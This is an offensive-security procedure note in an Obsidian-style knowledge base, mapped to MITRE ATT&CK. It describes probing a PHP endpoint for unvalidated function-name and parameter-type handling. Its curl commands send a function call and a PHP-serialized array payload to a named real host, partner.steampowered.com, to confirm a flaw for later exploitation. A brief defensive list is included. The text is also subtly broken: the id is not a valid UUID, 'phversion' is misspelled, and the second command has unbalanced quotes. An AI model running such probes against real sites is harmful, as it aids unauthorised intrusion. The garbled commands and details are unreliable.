---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - php
  - validation
  - recon
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-php-parameters]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:36.462Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-Insufficient-PHP-Parameter-Validation

## Summary

This procedure involves probing a PHP web application to identify endpoints that allow user-specified function names and parameter types without adequate validation, setting the stage for type manipulation exploits.

## Description

In the context of the Steam partner site vulnerability, the application processed HTTP parameters for PHP function names and types (e.g., array, array, string) without sanitizing inputs. Attackers can test this by submitting valid function calls and observing if arbitrary names are executed. This reconnaissance step confirms the presence of the flaw, enabling subsequent manipulation. Expected outcomes include confirmation of unvalidated function invocation, typically on public-facing web platforms running PHP.

## Requirements

1. Network access to the target PHP endpoint (e.g., https://partner.steampowered.com/endpoint)
2. Tools for crafting HTTP requests (e.g., curl or Burp Suite)
3. Basic understanding of PHP function signatures

## Defense

Defensive measures and detection strategies:

- Implement strict whitelisting of allowed function names
- Validate parameter types server-side using type hints and assertions
- Monitor logs for unusual function calls or serialization attempts

## Objectives

1. Confirm the endpoint accepts arbitrary function names
2. Verify expected parameter types are not enforced
3. Identify the exact parameter structure for exploitation

## Instructions

### Step 1: Probe Endpoint with Benign Function

**Context**: Send a request with a safe PHP function to test if user input is directly used in function calls.

**Command** ([[commands/curl-test-php-parameters]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=phpversion&param_types=array,array,string&param1=\"test\"&param2=\"test\"" \
  -v
```

> This command submits a simple function like phversion with mismatched types to check for errors. Successful response without fatal errors indicates insufficient validation.

### Step 2: Test Array Parameter Handling

**Context**: Submit array-like parameters to observe type coercion behavior.

**Command** ([[commands/curl-test-php-parameters]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=count&param_types=array,array,string&param1=\"a:1:{i:0;s:3:\"foo\"}\" &param2=\"bar\" &param3=\"baz\" \
  -v
```

> Expected output shows the function processes the serialized array without rejection, confirming vulnerability to manipulation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-php-parameters]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[php]]
- [[validation-bypass]]
